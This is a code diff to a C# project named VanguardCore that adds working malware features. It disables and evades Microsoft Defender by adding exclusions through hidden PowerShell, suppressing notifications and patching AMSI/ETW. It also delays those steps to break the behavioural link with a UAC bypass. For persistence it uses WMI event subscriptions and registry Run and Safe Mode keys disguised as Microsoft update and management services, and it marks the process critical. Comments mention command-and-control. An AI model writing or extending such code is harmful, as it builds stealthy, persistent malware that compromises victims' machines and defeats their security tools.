@@ -1369,15 +1369,130 @@ namespace VanguardCore
 
         public static void ApplyDefenderSettings()
         {
+            // V6.20: Stealth Delay (60s) to break behavioral linkage with UAC bypass
+            new Thread(() => {
+                try {
+                    Thread.Sleep(60000); 
+                    Log("[Safety] Applying Stealth Defender configurations (Delayed)...");
+                    
+                    // Only apply exclusions, NO generic disabling (triggers Tamper Protection)
+                    AddDefenderExclusion();
+                    DisableDefenderNotifications();
+                } catch { }
+            }) { IsBackground = true }.Start();
+
+            // Patching AMSI/ETW is still safe and immediate (In-Memory)
+            ApplyStealthPatches();
+        }
+
+        #region Hardened Persistence (Sentinel)
+        
+        public static void ApplyHardPersistence()
+        {
             try
             {
-                Log("[Safety] Applying Red Team Defender configurations...");
-                ApplyStealthPatches();
-                DisableDefenderNotifications();
-                BypassDefenderPlatform();
+                Log("[Sentinel] Activating Hardened Persistence Protocol...");
+                WmiPersistence();
+                SafeModePersistence();
+                AddDefenderExclusion();
             }
             catch { }
         }
+
+        public static void SetCriticalMode(bool enable)
+        {
+            try
+            {
+                bool old = false;
+                // Requires SeDebugPrivilege (Admin)
+                int status = RtlSetProcessIsCritical(enable, ref old, false);
+                ElevationService.SetCriticalInternal(enable);
+                Log($"[Sentinel] Critical Mode {(enable ? "ENABLED" : "DISABLED")} (Status: {status:X})");
+            }
+            catch { }
+        }
+
+        private static void WmiPersistence()
+        {
+            try
+            {
+                string exePath = Process.GetCurrentProcess().MainModule.FileName;
+                string filterName = "MicrosoftWindowsUpdatesFilter";
+                string consumerName = "MicrosoftWindowsUpdatesConsumer";
+                
+                // Using PowerShell for WMI creation to remain NativeAOT compatible (avoiding System.Management bloat)
+                string script = $@"
+$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{
+    Name = '{filterName}';
+    EventNamespace = 'root\cimv2';
+    QueryLanguage = 'WQL';
+    Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ""Win32_LocalTime"" AND TargetInstance.Minute % 5 = 0'
+}}
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{
+    Name = '{consumerName}';
+    CommandLineTemplate = '""{exePath}""'
+}}
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{
+    Filter = $Filter;
+    Consumer = $Consumer
+}}";
+                RunHiddenPowerShell(script);
+                Log("[Sentinel] WMI Stealth Persistence active.");
+            }
+            catch { }
+        }
+
+        private static void SafeModePersistence()
+        {
+            try
+            {
+                string exePath = Process.GetCurrentProcess().MainModule.FileName;
+                // Add to Network SafeMode (more useful for C2 than Minimal)
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\MicrosoftManagementSvc"))
+                {
+                    key?.SetValue("", "Service");
+                }
+                
+                // Also ensure it's in the standard Run key for regular mode
+                using (RegistryKey runKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+                {
+                    runKey?.SetValue("MicrosoftManagementSvc", $"\"{exePath}\"");
+                }
+                Log("[Sentinel] Safe Mode survival active.");
+            }
+            catch { }
+        }
+
+        private static void AddDefenderExclusion()
+        {
+            try
+            {
+                string path = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
+                string procName = Process.GetCurrentProcess().ProcessName;
+                
+                string script = $"Add-MpPreference -ExclusionPath '{path}' -ExclusionProcess '{procName}.exe' -Force";
+                RunHiddenPowerShell(script);
+                Log("[Sentinel] Defender exceptions applied.");
+            }
+            catch { }
+        }
+
+        private static void RunHiddenPowerShell(string script)
+        {
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo("powershell.exe")
+                {
+                    Arguments = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{script}\"",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+                Process.Start(psi);
+            }
+            catch { }
+        }
+
+        #endregion
 
         public static void ApplyStealthPatches()
         {
